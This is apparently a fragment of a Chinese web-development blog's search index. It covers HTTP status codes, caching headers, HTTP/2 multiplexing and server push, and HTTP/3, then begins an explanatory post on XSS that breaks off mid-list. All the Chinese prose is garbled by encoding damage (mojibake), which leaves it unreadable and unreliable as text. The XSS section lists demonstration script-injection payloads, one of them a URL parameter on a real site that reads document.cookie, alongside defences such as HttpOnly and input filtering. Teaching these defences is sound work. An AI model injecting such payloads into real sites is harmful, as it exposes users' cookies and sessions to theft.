æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶                     |\n| 409    | Conflict                        | æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›æ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª |\n| 410    | Gone                            | å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäº404ï¼Œå¦‚æœèµ„æºä»¥å‰æœ‰ç°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½® |\n| 411    | Length Required                 | æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯       |\n| 412    | Precondition Failed             | å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯                                 |\n| 413    | Request Entity Too Large        | ç”±äºè¯·æ±‚çš„å®ä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿ç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿æ¥ã€‚å¦‚æœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯ |\n| 414    | Request-URI Too Large           | è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†               |\n| 415    | Unsupported Media Type          | æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼                             |\n| 416    | Requested range not satisfiable | å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ                                         |\n| 417    | Expectation Failed              | æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯                             |\n|        |                                 |                                                              |\n| 500    | Internal Server Error           | æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚                                 |\n| 501    | Not Implemented                 | æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚                         |\n| 502    | Bad Gateway                     | ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº” |\n| 503    | Service Unavailable             | ç”±äºè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­ |\n| 504    | Gateway Time-out                | å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»è¿œç«¯æœåŠ¡å™¨è·å–è¯·æ±‚           |\n| 505    | HTTP Version not supported      | æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç†               |\n\n### 1.3 http ç¼“å­˜\n\nè™½ç„¶ HTTP ç¼“å­˜ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†é‡ç”¨ç¼“å­˜çš„èµ„æºé€šå¸¸æ˜¯å¿…è¦çš„ã€‚ç„¶è€Œå¸¸è§çš„ HTTP ç¼“å­˜åªèƒ½å­˜å‚¨ [`GET`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods/GET) å“åº”ï¼Œå¯¹äºå…¶ä»–ç±»å‹çš„å“åº”åˆ™æ— èƒ½ä¸ºåŠ›ã€‚ç¼“å­˜çš„å…³é”®ä¸»è¦åŒ…æ‹¬request methodå’Œç›®æ ‡URIï¼ˆä¸€èˆ¬åªæœ‰GETè¯·æ±‚æ‰ä¼šè¢«ç¼“å­˜ï¼‰ã€‚\n\nHTTP/1.1å®šä¹‰çš„ [`Cache-Control`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control) å¤´ç”¨æ¥åŒºåˆ†å¯¹ç¼“å­˜æœºåˆ¶çš„æ”¯æŒæƒ…å†µï¼Œ è¯·æ±‚å¤´å’Œå“åº”å¤´éƒ½æ”¯æŒè¿™ä¸ªå±æ€§ã€‚é€šè¿‡å®ƒæä¾›çš„ä¸åŒçš„å€¼æ¥å®šä¹‰ç¼“å­˜ç­–ç•¥ã€‚\n\n+ æ²¡æœ‰ç¼“å­˜\n\n  ç¼“å­˜ä¸­ä¸å¾—å­˜å‚¨ä»»ä½•å…³äºå®¢æˆ·ç«¯è¯·æ±‚å’ŒæœåŠ¡ç«¯å“åº”çš„å†…å®¹ã€‚æ¯æ¬¡ç”±å®¢æˆ·ç«¯å‘èµ·çš„è¯·æ±‚éƒ½ä¼šä¸‹è½½å®Œæ•´çš„å“åº”å†…å®¹ã€‚\n\n  ```html\n  Cache-Control: no-store\n  ```\n\n+ ç¼“å­˜ä½†é‡æ–°éªŒè¯\n\n  æ¯æ¬¡æœ‰è¯·æ±‚å‘å‡ºæ—¶ï¼Œç¼“å­˜ä¼šå°†æ­¤è¯·æ±‚å‘åˆ°æœåŠ¡å™¨ï¼ˆæ³¨ï¼šè¯¥è¯·æ±‚åº”è¯¥ä¼šå¸¦æœ‰ä¸æœ¬åœ°ç¼“å­˜ç›¸å…³çš„éªŒè¯å­—æ®µï¼‰ï¼ŒæœåŠ¡å™¨ç«¯ä¼šéªŒè¯è¯·æ±‚ä¸­æ‰€æè¿°çš„ç¼“å­˜æ˜¯å¦è¿‡æœŸï¼Œè‹¥æœªè¿‡æœŸï¼ˆæ³¨ï¼šå®é™…å°±æ˜¯è¿”å›304ï¼‰ï¼Œåˆ™ç¼“å­˜æ‰ä½¿ç”¨æœ¬åœ°ç¼“å­˜å‰¯æœ¬ã€‚\n\n  ```html\n  Cache-Control: no-cache\n  ```\n\n+ ç§æœ‰å’Œå…¬å…±ç¼“å­˜\n\n  + \"public\" æŒ‡ä»¤è¡¨ç¤ºè¯¥å“åº”å¯ä»¥è¢«ä»»ä½•ä¸­é—´äººï¼ˆæ³¨ï¼šæ¯”å¦‚ä¸­é—´ä»£ç†ã€CDNç­‰ï¼‰ç¼“å­˜ã€‚\n\n    è‹¥æŒ‡å®šäº†\"public\"ï¼Œåˆ™ä¸€äº›é€šå¸¸ä¸è¢«ä¸­é—´äººç¼“å­˜çš„é¡µé¢ï¼ˆæ¯”å¦‚ å¸¦æœ‰HTTPéªŒè¯ä¿¡æ¯ï¼ˆå¸å·å¯†ç ï¼‰çš„é¡µé¢ æˆ– æŸäº›ç‰¹å®šçŠ¶æ€ç çš„é¡µé¢ï¼‰ï¼Œå°†ä¼šè¢«å…¶ç¼“å­˜ã€‚\n\n  + \"private\" åˆ™è¡¨ç¤ºè¯¥å“åº”æ˜¯ä¸“ç”¨äºæŸå•ä¸ªç”¨æˆ·çš„ï¼Œä¸­é—´äººä¸èƒ½ç¼“å­˜æ­¤å“åº”ï¼Œè¯¥å“åº”åªèƒ½åº”ç”¨äºæµè§ˆå™¨ç§æœ‰ç¼“å­˜ä¸­ã€‚\n\n  ```html\n  Cache-Control: private\n  Cache-Control: public\n  ```\n\n+ è¿‡æœŸ\n\n  è¿‡æœŸæœºåˆ¶ä¸­ï¼Œæœ€é‡è¦çš„æŒ‡ä»¤æ˜¯ \"`max-age=<seconds>`\"ï¼Œè¡¨ç¤ºèµ„æºèƒ½å¤Ÿè¢«ç¼“å­˜ï¼ˆä¿æŒæ–°é²œï¼‰çš„æœ€å¤§æ—¶é—´ã€‚ç›¸å¯¹[Expires](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Expires)è€Œè¨€ï¼Œmax-ageæ˜¯è·ç¦»è¯·æ±‚å‘èµ·çš„æ—¶é—´çš„ç§’æ•°ã€‚é’ˆå¯¹åº”ç”¨ä¸­é‚£äº›ä¸ä¼šæ”¹å˜çš„æ–‡ä»¶ï¼Œé€šå¸¸å¯ä»¥æ‰‹åŠ¨è®¾ç½®ä¸€å®šçš„æ—¶é•¿ä»¥ä¿è¯ç¼“å­˜æœ‰æ•ˆï¼Œä¾‹å¦‚å›¾ç‰‡ã€cssã€jsç­‰é™æ€èµ„æºã€‚\n\n  ```html\n  Cache-Control: max-age=31536000\n  ```\n\n+ éªŒè¯æ–¹å¼\n\n  å½“ä½¿ç”¨äº† \"`must-revalidate`\" æŒ‡ä»¤ï¼Œé‚£å°±æ„å‘³ç€ç¼“å­˜åœ¨è€ƒè™‘ä½¿ç”¨ä¸€ä¸ªé™ˆæ—§çš„èµ„æºæ—¶ï¼Œå¿…é¡»å…ˆéªŒè¯å®ƒçš„çŠ¶æ€ï¼Œå·²è¿‡æœŸçš„ç¼“å­˜å°†ä¸è¢«ä½¿ç”¨ã€‚\n\n  ```html\n  Cache-Control: must-revalidate\n  ```\n\n##### 1.3.1 ç¼“å­˜éªŒè¯\n\nå½“å‘æœåŠ¡ç«¯å‘èµ·ç¼“å­˜æ ¡éªŒçš„è¯·æ±‚æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å› [`200`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/200) okè¡¨ç¤ºè¿”å›æ­£å¸¸çš„ç»“æœæˆ–è€… [`304`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/304) Not Modified(ä¸è¿”å›body)è¡¨ç¤ºæµè§ˆå™¨å¯ä»¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜æ–‡ä»¶ã€‚304çš„å“åº”å¤´ä¹Ÿå¯ä»¥åŒæ—¶æ›´æ–°ç¼“å­˜æ–‡æ¡£çš„è¿‡æœŸæ—¶é—´ã€‚\n\n+ ETags\n\n  ä½œä¸ºç¼“å­˜çš„ä¸€ç§å¼ºæ ¡éªŒå™¨ï¼Œ[`ETag`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/ETag) å“åº”å¤´æ˜¯ä¸€ä¸ªå¯¹ç”¨æˆ·ä»£ç†(User Agent, ä¸‹é¢ç®€ç§°UA)ä¸é€æ˜çš„å€¼ã€‚\n\n  å¦‚æœèµ„æºè¯·æ±‚çš„å“åº”å¤´é‡Œå«æœ‰ETag, å®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚çš„å¤´ä¸­å¸¦ä¸Š [`If-None-Match`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match) å¤´æ¥éªŒè¯ç¼“å­˜ã€‚\n\n+ Last-Modified\n\n   å“åº”å¤´å¯ä»¥ä½œä¸ºä¸€ç§å¼±æ ¡éªŒå™¨ã€‚è¯´å®ƒå¼±æ˜¯å› ä¸ºå®ƒåªèƒ½ç²¾ç¡®åˆ°ä¸€ç§’ã€‚\n\n  å¦‚æœå“åº”å¤´é‡Œå«æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚ä¸­å¸¦ä¸Š [`If-Modified-Since`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-Modified-Since) æ¥éªŒè¯ç¼“å­˜ã€‚\n\n\n\n### 1.4 httpæŒä¹…åŒ–è¿æ¥, å¤šä¸ªè¯·æ±‚å¤ç”¨ tcp\n\nHttp 1.1 ç‰ˆçš„æœ€å¤§å˜åŒ–ï¼Œå°±æ˜¯å¼•å…¥äº†æŒä¹…è¿æ¥ï¼ˆpersistent connectionï¼‰ï¼Œå³TCPè¿æ¥é»˜è®¤ä¸å…³é—­ï¼Œå¯ä»¥è¢«å¤šä¸ªè¯·æ±‚å¤ç”¨ï¼Œä¸ç”¨æ˜ç¡®å£°æ˜`Connection: keep-alive`ã€‚\n\n\n\n### 1.5 httpç®¡é“, å¤šä¸ªè¯·æ±‚åŒæ—¶ç”¨ä¸€ä¸ªtcp\n\nHttp 1.1 ç‰ˆè¿˜å¼•å…¥äº†ç®¡é“æœºåˆ¶ï¼ˆpipeliningï¼‰ï¼Œå³åœ¨åŒä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚ã€‚è¿™æ ·å°±è¿›ä¸€æ­¥æ”¹è¿›äº†HTTPåè®®çš„æ•ˆç‡ã€‚\n\nä¸¾ä¾‹æ¥è¯´ï¼Œå®¢æˆ·ç«¯éœ€è¦è¯·æ±‚ä¸¤ä¸ªèµ„æºã€‚ä»¥å‰çš„åšæ³•æ˜¯ï¼Œåœ¨åŒä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼Œå…ˆå‘é€Aè¯·æ±‚ï¼Œç„¶åç­‰å¾…æœåŠ¡å™¨åšå‡ºå›åº”ï¼Œæ”¶åˆ°åå†å‘å‡ºBè¯·æ±‚ã€‚ç®¡é“æœºåˆ¶åˆ™æ˜¯å…è®¸æµè§ˆå™¨åŒæ—¶å‘å‡ºAè¯·æ±‚å’ŒBè¯·æ±‚ï¼Œä½†æ˜¯æœåŠ¡å™¨è¿˜æ˜¯æŒ‰ç…§é¡ºåºï¼Œå…ˆå›åº”Aè¯·æ±‚ï¼Œå®Œæˆåå†å›åº”Bè¯·æ±‚ã€‚\n\næ³¨æ„ï¼šè¿™ä¸ªpipeliningä»…ä»…æ˜¯é™äºç†è®ºåœºæ™¯ä¸‹ï¼Œå¤§éƒ¨åˆ†æ¡Œé¢æµè§ˆå™¨ä»ç„¶ä¼šé€‰æ‹©é»˜è®¤å…³é—­HTTP pipeliningï¼\n\n\n\n# 2. http2\n\n### 2.1 å¤´ä¿¡æ¯å‹ç¼©\n\nHTTP åè®®ä¸å¸¦æœ‰çŠ¶æ€ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½å¿…é¡»é™„ä¸Šæ‰€æœ‰ä¿¡æ¯ã€‚æ‰€ä»¥ï¼Œè¯·æ±‚çš„å¾ˆå¤šå­—æ®µéƒ½æ˜¯é‡å¤çš„ï¼Œæ¯”å¦‚`Cookie`å’Œ`User Agent`ï¼Œä¸€æ¨¡ä¸€æ ·çš„å†…å®¹ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½å¿…é¡»é™„å¸¦ï¼Œè¿™ä¼šæµªè´¹å¾ˆå¤šå¸¦å®½ï¼Œä¹Ÿå½±å“é€Ÿåº¦ã€‚\n\nHTTP/2 å¯¹è¿™ä¸€ç‚¹åšäº†ä¼˜åŒ–ï¼Œå¼•å…¥äº†å¤´ä¿¡æ¯å‹ç¼©æœºåˆ¶ï¼ˆheader compressionï¼‰ã€‚ä¸€æ–¹é¢ï¼Œå¤´ä¿¡æ¯ä½¿ç”¨`gzip`æˆ–`compress`å‹ç¼©åå†å‘é€ï¼›å¦ä¸€æ–¹é¢ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ—¶ç»´æŠ¤ä¸€å¼ å¤´ä¿¡æ¯è¡¨ï¼Œæ‰€æœ‰å­—æ®µéƒ½ä¼šå­˜å…¥è¿™ä¸ªè¡¨ï¼Œç”Ÿæˆä¸€ä¸ªç´¢å¼•å·ï¼Œä»¥åå°±ä¸å‘é€åŒæ ·å­—æ®µäº†ï¼Œåªå‘é€ç´¢å¼•å·ï¼Œè¿™æ ·å°±æé«˜é€Ÿåº¦äº†ã€‚\n\n\n\n### 2.2 å¤šè·¯å¤ç”¨\n\nHTTP/2 å¤ç”¨TCPè¿æ¥ï¼Œåœ¨ä¸€ä¸ªè¿æ¥é‡Œï¼Œå®¢æˆ·ç«¯å’Œæµè§ˆå™¨éƒ½å¯ä»¥åŒæ—¶å‘é€å¤šä¸ªè¯·æ±‚æˆ–å›åº”ï¼Œè€Œä¸”ä¸ç”¨æŒ‰ç…§é¡ºåºä¸€ä¸€å¯¹åº”ï¼Œè¿™æ ·å°±é¿å…äº†\"é˜Ÿå¤´å µå¡\"ã€‚\n\nä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨ä¸€ä¸ªTCPè¿æ¥é‡Œé¢ï¼ŒæœåŠ¡å™¨åŒæ—¶æ”¶åˆ°äº†Aè¯·æ±‚å’ŒBè¯·æ±‚ï¼Œäºæ˜¯å…ˆå›åº”Aè¯·æ±‚ï¼Œç»“æœå‘ç°å¤„ç†è¿‡ç¨‹éå¸¸è€—æ—¶ï¼Œäºæ˜¯å°±å‘é€Aè¯·æ±‚å·²ç»å¤„ç†å¥½çš„éƒ¨åˆ†ï¼Œ æ¥ç€å›åº”Bè¯·æ±‚ï¼Œå®Œæˆåï¼Œå†å‘é€Aè¯·æ±‚å‰©ä¸‹çš„éƒ¨åˆ†ã€‚\n\nè¿™æ ·åŒå‘çš„ã€å®æ—¶çš„é€šä¿¡ï¼Œå°±å«åšå¤šå·¥ï¼ˆMultiplexingï¼‰ã€‚\n\n+ å®ç°åŸç†, æ•°æ®æµ\n+ ç¼ºç‚¹, ä¸€ä¸ª tcp ä¸¢åŒ…\n\n### 2.3 æœåŠ¡å™¨æ¨é€\n\nHTTP/2 å…è®¸æœåŠ¡å™¨æœªç»è¯·æ±‚ï¼Œä¸»åŠ¨å‘å®¢æˆ·ç«¯å‘é€èµ„æºï¼Œè¿™å«åšæœåŠ¡å™¨æ¨é€ï¼ˆserver pushï¼‰ã€‚\n\nServer Pushä¸åŒäºWebsocketï¼ŒServer Pushä¸€èˆ¬æ˜¯æŒ‡æœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ï¼Œè¿™æ˜¯ä¸€ç§å•å‘çš„ä¸»åŠ¨æ¨é€ï¼Œè€ŒWebSocketæ˜¯åŒå‘çš„ï¼Œè¿™ä¸¤ç§æŠ€æœ¯ä¸æ˜¯ç«äº‰å…³ç³»ã€‚\n\nServer Pushå¯ä»¥ç”¨åœ¨æœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€é™æ€èµ„æºï¼Œæ¯”å¦‚æµè§ˆå™¨è¯·æ±‚index.htmlæ—¶ï¼ŒæœåŠ¡å™¨é™¤äº†è¿”å›ç½‘é¡µå†…å®¹å¤–ï¼Œè¿˜ä¼šå°†index.htmlé¡µé¢é‡Œé¢çš„å„ç§csså’Œjsä¸€èµ·æ¨é€åˆ°æµè§ˆå™¨ç¼“å­˜èµ·æ¥ï¼Œå½“æµè§ˆå™¨åˆ†æäº†ç½‘é¡µå†…å®¹å‘ç°é™æ€èµ„æºæ—¶ï¼Œä¸éœ€è¦å†å»æœåŠ¡å™¨è¯·æ±‚ä¸€æ¬¡ï¼Œå®ƒåªéœ€è¦ä»ç¼“å­˜é‡Œç›´æ¥æ‹¿å°±å¯ä»¥äº†ã€‚ä¸è¿‡ç°ä»£çš„ç½‘ç«™çš„é™æ€èµ„æºå¤§å¤šéƒ½æ˜¯CDNæ¶æ„çš„ï¼Œé™æ€èµ„æºéƒ½åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ï¼ŒServer Pushåœ¨è¿™æ–¹é¢ä½œç”¨å¹¶ä¸å¤§ã€‚\n\n\n\n### 2.4 äºŒè¿›åˆ¶åè®®\n\nHTTP/1.1 ç‰ˆçš„å¤´ä¿¡æ¯è‚¯å®šæ˜¯æ–‡æœ¬ï¼ˆASCIIç¼–ç ï¼‰ï¼Œæ•°æ®ä½“å¯ä»¥æ˜¯æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯äºŒè¿›åˆ¶ã€‚\n\nHTTP/2 åˆ™æ˜¯ä¸€ä¸ªå½»åº•çš„äºŒè¿›åˆ¶åè®®ï¼Œå¤´ä¿¡æ¯å’Œæ•°æ®ä½“éƒ½æ˜¯äºŒè¿›åˆ¶ï¼Œå¹¶ä¸”ç»Ÿç§°ä¸º\"å¸§\"ï¼ˆframeï¼‰ï¼šå¤´ä¿¡æ¯å¸§å’Œæ•°æ®å¸§ã€‚\n\näºŒè¿›åˆ¶åè®®çš„ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå¯ä»¥å®šä¹‰é¢å¤–çš„å¸§ã€‚HTTP/2 å®šä¹‰äº†è¿‘åç§å¸§ï¼Œä¸ºå°†æ¥çš„é«˜çº§åº”ç”¨æ‰“å¥½äº†åŸºç¡€ã€‚å¦‚æœä½¿ç”¨æ–‡æœ¬å®ç°è¿™ç§åŠŸèƒ½ï¼Œè§£ææ•°æ®å°†ä¼šå˜å¾—éå¸¸éº»çƒ¦ï¼ŒäºŒè¿›åˆ¶è§£æåˆ™æ–¹ä¾¿å¾—å¤šã€‚\n\n\n\n### 2.5 æ•°æ®æµ\n\nå› ä¸º HTTP/2 çš„æ•°æ®åŒ…æ˜¯ä¸æŒ‰é¡ºåºå‘é€çš„ï¼ŒåŒä¸€ä¸ªè¿æ¥é‡Œé¢è¿ç»­çš„æ•°æ®åŒ…ï¼Œå¯èƒ½å±äºä¸åŒçš„å›åº”ã€‚å› æ­¤ï¼Œå¿…é¡»è¦å¯¹æ•°æ®åŒ…åšæ ‡è®°ï¼ŒæŒ‡å‡ºå®ƒå±äºå“ªä¸ªå›åº”ã€‚\n\nHTTP/2 å°†æ¯ä¸ªè¯·æ±‚æˆ–å›åº”çš„æ‰€æœ‰æ•°æ®åŒ…ï¼Œç§°ä¸ºä¸€ä¸ªæ•°æ®æµï¼ˆstreamï¼‰ã€‚æ¯ä¸ªæ•°æ®æµéƒ½æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç¼–å·ã€‚æ•°æ®åŒ…å‘é€çš„æ—¶å€™ï¼Œéƒ½å¿…é¡»æ ‡è®°æ•°æ®æµIDï¼Œç”¨æ¥åŒºåˆ†å®ƒå±äºå“ªä¸ªæ•°æ®æµã€‚å¦å¤–è¿˜è§„å®šï¼Œå®¢æˆ·ç«¯å‘å‡ºçš„æ•°æ®æµï¼ŒIDä¸€å¾‹ä¸ºå¥‡æ•°ï¼ŒæœåŠ¡å™¨å‘å‡ºçš„ï¼ŒIDä¸ºå¶æ•°ã€‚\n\næ•°æ®æµå‘é€åˆ°ä¸€åŠçš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½å¯ä»¥å‘é€ä¿¡å·ï¼ˆ`RST_STREAM`å¸§ï¼‰ï¼Œå–æ¶ˆè¿™ä¸ªæ•°æ®æµã€‚1.1ç‰ˆå–æ¶ˆæ•°æ®æµçš„å”¯ä¸€æ–¹æ³•ï¼Œå°±æ˜¯å…³é—­TCPè¿æ¥ã€‚è¿™å°±æ˜¯è¯´ï¼ŒHTTP/2 å¯ä»¥å–æ¶ˆæŸä¸€æ¬¡è¯·æ±‚ï¼ŒåŒæ—¶ä¿è¯TCPè¿æ¥è¿˜æ‰“å¼€ç€ï¼Œå¯ä»¥è¢«å…¶ä»–è¯·æ±‚ä½¿ç”¨ã€‚\n\nå®¢æˆ·ç«¯è¿˜å¯ä»¥æŒ‡å®šæ•°æ®æµçš„ä¼˜å…ˆçº§ã€‚ä¼˜å…ˆçº§è¶Šé«˜ï¼ŒæœåŠ¡å™¨å°±ä¼šè¶Šæ—©å›åº”ã€‚\n\n\n\n# 3. http3\n\nHTTP/2 ä½¿ç”¨äº†å¤šè·¯å¤ç”¨ï¼Œä¸€èˆ¬æ¥è¯´åŒä¸€åŸŸåä¸‹åªéœ€è¦ä½¿ç”¨ä¸€ä¸ª TCP è¿æ¥ã€‚ä½†å½“è¿™ä¸ªè¿æ¥ä¸­å‡ºç°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œé‚£å°±ä¼šå¯¼è‡´ HTTP/2 çš„è¡¨ç°æƒ…å†µåå€’ä¸å¦‚ HTTP/1 äº†ã€‚\n\nå› ä¸ºåœ¨å‡ºç°ä¸¢åŒ…çš„æƒ…å†µä¸‹ï¼Œæ•´ä¸ª TCP éƒ½è¦å¼€å§‹ç­‰å¾…é‡ä¼ ï¼Œä¹Ÿå°±å¯¼è‡´äº†åé¢çš„æ‰€æœ‰æ•°æ®éƒ½è¢«é˜»å¡äº†ã€‚ä½†æ˜¯å¯¹äº HTTP/1.1 æ¥è¯´ï¼Œå¯ä»¥å¼€å¯å¤šä¸ª TCP è¿æ¥ï¼Œå‡ºç°è¿™ç§æƒ…å†µååˆ°åªä¼šå½±å“å…¶ä¸­ä¸€ä¸ªè¿æ¥ï¼Œå‰©ä½™çš„ TCP è¿æ¥è¿˜å¯ä»¥æ­£å¸¸ä¼ è¾“æ•°æ®ã€‚\n\nGoogle å°±æ›´èµ·ç‚‰ç¶æäº†ä¸€ä¸ªåŸºäº UDP åè®®çš„ QUIC åè®®ï¼Œå¹¶ä¸”ä½¿ç”¨åœ¨äº† HTTP/3 ä¸Šï¼ŒHTTP/3 ä¹‹å‰åä¸º HTTP-over-QUICï¼Œä»è¿™ä¸ªåå­—ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°ï¼ŒHTTP/3 æœ€å¤§çš„æ”¹é€ å°±æ˜¯ä½¿ç”¨äº† QUICã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\n+ https://www.ruanyifeng.com/blog/2016/08/http.html\n+ https://zhuanlan.zhihu.com/p/58668946","tags":["http"],"categories":["Web"]},{"title":"å¸¸è§webå®‰å…¨æ”»å‡»ä»‹ç»","url":"%2Fp%2F37ebc6b1.html","content":"\n# 1. XSS (**è·¨ç«™è„šæœ¬æ”»å‡»**,è½åœ¨è„šæœ¬)\n\nXSSï¼Œå³ Cross Site Scriptï¼Œä¸­è¯‘æ˜¯è·¨ç«™è„šæœ¬æ”»å‡»ï¼›å…¶åŸæœ¬ç¼©å†™æ˜¯ CSSï¼Œä½†ä¸ºäº†å’Œå±‚å æ ·å¼è¡¨(Cascading Style Sheet)æœ‰æ‰€åŒºåˆ†ï¼Œå› è€Œåœ¨å®‰å…¨é¢†åŸŸå«åš XSSã€‚\n\n```javascript\n<script>alert('xssæ”»å‡»å¼€å§‹')</script>\n<script>alert('1')</script>\n<script>alert('2')</script>\n<script>alert('3\"')</script>\n```\n\n<!-- more -->\n\nXSS æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…åœ¨ç½‘ç«™ä¸Šæ³¨å…¥æ¶æ„çš„å®¢æˆ·ç«¯ä»£ç ï¼Œé€šè¿‡æ¶æ„è„šæœ¬å¯¹å®¢æˆ·ç«¯ç½‘é¡µè¿›è¡Œç¯¡æ”¹ï¼Œä»è€Œåœ¨ç”¨æˆ·æµè§ˆç½‘é¡µæ—¶ï¼Œå¯¹ç”¨æˆ·æµè§ˆå™¨è¿›è¡Œæ§åˆ¶æˆ–è€…è·å–ç”¨æˆ·éšç§æ•°æ®çš„ä¸€ç§æ”»å‡»æ–¹å¼ã€‚\n\n\n\n### 1.1 ä¸¾ä¾‹\n\n+ åœ¨ç½‘é¡µ input æˆ–è€… textarea ä¸­è¾“å…¥` <script>alert('xss')</script>`æˆ–è€…å…¶ä»–è„šæœ¬\n+ ç›´æ¥ä½¿ç”¨ URL å‚æ•°æ”»å‡»` https://www.baidu.com?jarttoTest=<script>alert(document.cookie)</script>`\n\n\n\n### 1.2 é˜²èŒƒ\n\n+ HttpOnly é˜²æ­¢åŠ«å– Cookie\n\n+ ç”¨æˆ·è¾“å…¥æ£€æŸ¥\n\n  ä¸è¦ç›¸ä¿¡ç”¨æˆ·çš„ä»»ä½•è¾“å…¥ã€‚  å¯¹äºç”¨æˆ·çš„ä»»ä½•è¾“å…¥è¦è¿›è¡Œæ£€æŸ¥ã€è¿‡æ»¤å’Œè½¬ä¹‰ã€‚å»ºç«‹å¯ä¿¡ä»»çš„å­—ç¬¦å’Œ HTML æ ‡ç­¾ç™½åå•ï¼Œå¯¹äºä¸åœ¨ç™½åå•ä¹‹åˆ—çš„å­—ç¬¦æˆ–è€…æ ‡ç­¾è¿›è¡Œè¿‡æ»¤æˆ–ç¼–ç ã€‚\n\n  åœ¨ XSS é˜²å¾¡ä¸­ï¼Œè¾“å…¥æ£€æŸ¥ä¸€èˆ¬æ˜¯æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä¸­æ˜¯å¦åŒ…å« <ï¼Œ> ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤æˆ–ç¼–ç ï¼Œè¿™ç§æ–¹å¼ä¹Ÿç§°ä¸º XSS Filterã€‚\n\n+ 